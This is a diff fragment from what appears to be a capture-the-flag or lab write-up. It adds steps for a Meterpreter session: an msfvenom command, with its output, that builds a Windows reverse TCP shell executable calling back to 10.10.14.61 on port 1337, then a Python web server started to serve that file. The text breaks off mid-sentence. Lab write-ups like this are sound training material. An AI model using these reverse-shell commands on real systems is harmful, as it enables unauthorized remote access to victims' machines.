@@ -191,6 +191,25 @@ In order to see what the user is doing in this session, it might be a good idea 
 
 # Meterpreter session 
 
-I think this active session is int
+I think this active session is interesting and if i remember correctly meterpreter has a built in option to watch the screen 
+
+```python
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1337 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: shell.exe
+```
+
+Ill create a shell
+
+```python
+❯❯❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Ill start a webs
 
 
